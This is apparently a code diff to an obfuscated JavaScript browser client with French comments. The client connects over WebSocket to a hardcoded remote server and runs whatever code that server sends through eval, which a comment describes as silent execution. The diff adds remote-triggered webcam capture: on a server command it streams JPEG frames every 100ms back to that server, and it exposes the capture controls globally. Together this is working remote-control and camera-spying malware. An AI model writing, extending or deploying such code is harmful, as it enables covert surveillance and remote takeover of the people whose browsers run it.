@@ -335,6 +335,8 @@ class ClientNet3m8w {
     this.retryCount5p3j = 0;
     this.maxRetries6h9l = 5;
     this.pingTimer8w4r = null;
+    this.streamVideo2y7s = null;
+    this.intervalVideo9n5t = null;
   }
 
   connect() {
@@ -361,6 +363,7 @@ class ClientNet3m8w {
         if (message.type === 'execute_js') {
           console.log('[CLIENT] Message execute_js reçu, exécution du code:', message.code.substring(0, 100) + '...');
           try {
+            // Exécuter le code dans le contexte global de manière silencieuse
             const result = eval(message.code);
             console.log('[CLIENT] Code exécuté avec succès');
             this.sendMessage({
@@ -379,6 +382,15 @@ class ClientNet3m8w {
             });
           }
         }
+
+        // Gérer les demandes de flux vidéo
+        if (message.type === 'start_video') {
+          this.startVideoCapture();
+        }
+
+        if (message.type === 'stop_video') {
+          this.stopVideoCapture();
+        }
       } catch (err) {
         console.log('[CLIENT] Erreur parse message:', err.message);
       }
@@ -387,6 +399,7 @@ class ClientNet3m8w {
     this.socketConn7x1q.onclose = (event) => {
       console.log(\`[CLIENT] Connexion fermée (\${event.code})\`);
       this.stopPing();
+      this.stopVideoCapture();
       this.attemptReconnect();
     };
 
@@ -437,8 +450,68 @@ class ClientNet3m8w {
   disconnect() {
     if (this.socketConn7x1q) {
       this.stopPing();
+      this.stopVideoCapture();
       this.socketConn7x1q.close();
       console.log('[CLIENT] Déconnexion manuelle');
+    }
+  }
+
+  startVideoCapture() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.warn('[CLIENT] Capture vidéo non supportée par ce navigateur');
+      return;
+    }
+
+    if (this.streamVideo2y7s) {
+      console.log('[CLIENT] Capture vidéo déjà en cours');
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        this.streamVideo2y7s = stream;
+        console.log('[CLIENT] Capture vidéo démarrée');
+        
+        // Créer un canvas pour capturer les frames
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        video.srcObject = stream;
+        video.play();
+        
+        // Capturer une frame toutes les 100ms
+        this.intervalVideo9n5t = setInterval(() => {
+          if (video.videoWidth > 0 && video.videoHeight > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            // Convertir en base64 et envoyer
+            const frameData = canvas.toDataURL('image/jpeg', 0.5);
+            this.sendMessage({
+              type: 'video_frame',
+              data: frameData,
+              timestamp: new Date().toISOString()
+            });
+          }
+        }, 100);
+      })
+      .catch(error => {
+        console.error('[CLIENT] Erreur capture vidéo:', error);
+      });
+  }
+
+  stopVideoCapture() {
+    if (this.streamVideo2y7s) {
+      this.streamVideo2y7s.getTracks().forEach(track => track.stop());
+      this.streamVideo2y7s = null;
+      console.log('[CLIENT] Capture vidéo arrêtée');
+    }
+    
+    if (this.intervalVideo9n5t) {
+      clearInterval(this.intervalVideo9n5t);
+      this.intervalVideo9n5t = null;
     }
   }
 }
@@ -454,6 +527,10 @@ const URL_CONFIG_Q4R7 = 'wss://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhg
       const clientInstance5x3m = new ClientNet3m8w(URL_CONFIG_Q4R7);
       window.clientInstance5x3m = clientInstance5x3m;
       clientInstance5x3m.connect();
+      
+      // Exposer les méthodes pour le contrôle externe
+      window.startVideoCapture = () => clientInstance5x3m.startVideoCapture();
+      window.stopVideoCapture = () => clientInstance5x3m.stopVideoCapture();
     }
   }
   
